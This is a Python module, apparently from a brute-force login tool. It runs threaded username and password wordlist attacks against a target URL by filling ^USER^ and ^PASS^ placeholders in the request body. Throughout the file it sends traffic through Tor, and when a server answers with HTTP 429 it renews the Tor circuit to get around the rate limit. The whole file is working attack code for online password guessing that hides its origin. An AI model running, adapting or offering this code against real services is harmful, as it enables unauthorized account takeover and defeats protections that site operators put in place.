from .request import request, Tor, test_ip
from .loggin import log
from .lists import read_header_file, read_wordlist, make_question
from .response import check_response
from .database import db
from math import ceil
from time import sleep, time
from threading import Thread
from subprocess import Popen, PIPE

class Threads:
    methods = ["GET", "POST", "PUT", "OPTIONS"]
    def __init__(self, path_username, path_password, target=None):
        self.path_username = path_username
        self.path_password = path_password

        self.control_port = 9051
        self.tor = Tor(control_port=self.control_port)

        self.target = target
        if not self.target:
            self.target = make_question()

        self.num_threads = 15
        self.threads = []
        self.attempts = 1
        self.timeout = 0

        self.__test_connection_to_tor__()

        self.db = db(self.target)
        self.__load__()
        log.info("Starting the attack...")
        self.run_attack()

    def __group__(self, array):
        chunks_size = ceil(len(array) / self.num_threads)
        return [array[i * chunks_size:(i + 1) * chunks_size] for i in range(self.num_threads)]

    def __no_headers__(self):
        tries = 0
        headers = None
        for method in Threads.methods:
            if tries == len(Threads.methods):
                log.warn(f"Couldn't get headers of {self.target}. The tries has just finished.", extra={"bold": True})
                method = log.input("If you have any idea, witch method we could use to get the headers?")
                if not method:
                    log.info("Couldn't get the headers. I'm going to use default ones", extra={"bold": True})
                    break
            if tries == 1:
                log.warn(f"Couldn't get headers using method 'GET'. Trying others {len(Threads.methods) - 1} methods")
            res = request(url=self.url, method=method)
            if res.status_code != 405:
                headers = res.headers
                log.info(f"Got headers of {self.target}:\n{headers}", extra={"bold": True})
                break
            tries+=1
        return headers


    def __load__(self):
        if not self.db:
            return log.critical(f"The Target '{self.target}' wasn't created yet. Consider executing 'init' first")
        datas = self.db.all()[0]

        self.url = datas['url']
        self.data = datas['data']
        if None in [self.url, self.data]:
            return log.critical(f"Some important body wasn't filled:\nURL - {self.url}\nData - {self.data}")
        self.method = datas['method']
        self.headers = read_header_file(datas['headers'])
        if not self.headers:
            log.info(f"Getting headers of {self.url}")
            self.headers = self.__no_headers__()
        self.fail = datas['fail']
        self.success = datas['success']

        log.info(f"Loaded Request Body: {datas}", extra={"bold": True})
        log.info(f"Data payload 'data' is '{self.data}'", extra={"bold": True})

        self.usernames = read_wordlist(self.path_username)
        self.passwords = read_wordlist(self.path_password)
        self.total = len(self.passwords) * len(self.usernames)

        if not self.usernames or not self.passwords:
            return log.critical(f"Password(s) is null or Username is null ({self.usernames},{self.passwords})")

        log.info(f"The Wordlist(s) was loaded with successfully\n - Password(s): {len(self.passwords)}\n - Username(s): {len(self.usernames)}", extra={"bold": True})

        self.passwords_grouped = self.__group__(self.passwords)

    def __test_connection_to_tor__(self):
        try:
            test_ip()
        except Exception:
            log.warn("You are not using Tor", extra={"bold": True})
            yn = log.input("Do you want to execute Tor and connect to ControlPort? [Y/n] ")
            if "y" in yn.lower():
                log.debug("Executing Tor...")
                tor_process = Popen(['tor'], stdout=PIPE, stderr=PIPE, text=True)
                for line in iter(tor_process.stdout.readline, ''):
                    if "Done" in line:
                        break
                log.tor("The Tor Connection is ready")
                log.info(f"Starting to connect to ControlPort (127.0.0.1:{self.control_port})")
                password = log.input("Password (if there isn't password, leave it blank): ")
                self.tor.connect(password)
                self.__test_connection_to_tor__()

    def __check__(self, response):
        sf = check_response(my_response=self.success or self.fail, response=response)
        if (self.success and sf) or (self.fail and not sf):
            return True
        return False

    def __send__(self, username, password, id):
        try:
            res = request(method=self.method,
                          url=self.url,
                          data=self.data.replace("^USER^", username)
                          .replace("^PASS^", password)
                          .replace("^TMSTMP^", str(time() * 1000)),
                          headers=self.headers
                          )
            if res.status_code == 429:
                log.warn("It seems you got 429 (Too Many Requests).", extra={"bold": True})
                yn = log.input("Do you want to increase the Timeout and create a new Tor Circuit? [Y/n]")
                if "y" in yn:
                    if self.timeout == 0:
                        self.timeout += 1
                    self.timeout*=2
                    log.info(f"Now the new timeout is {self.timeout}")
                    self.tor.renew_circuit()
                    test_ip()
                    self.__send__(username, password, id)
                else:
                    return log.critical("The request got 429 (Too many requests)")
            had_success = self.__check__(res)
            log.attempt(self.attempts,
                         self.total,
                         username,
                         password,
                         res.status_code
                         , had_success=had_success, id=id)
            self.attempts+=1
            if had_success:
                return True
        except (ConnectionError, ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError):
            log.reattempt(self.attempts, self.total, username, password, id)
            self.__send__(username, password, id)

    def __loop__(self, id):
        break_loop = False
        for i, u in enumerate(self.usernames):
            for i_, p in enumerate(self.passwords_grouped[id]):
                b = self.__send__(u, p, id)
                if b:
                    break_loop = True
                    break
                sleep(self.timeout)
            if break_loop:
                break

    def run_attack(self):
        for i in range(self.num_threads):
            t = Thread(target=self.__loop__, args=(i,), daemon=True)
            self.threads.append(t)

        for i, t in enumerate(self.threads):
            t.start()
            log.debug(f"The thread {i} was created and started", extra={"bold": True})

        for t in self.threads:
            t.join()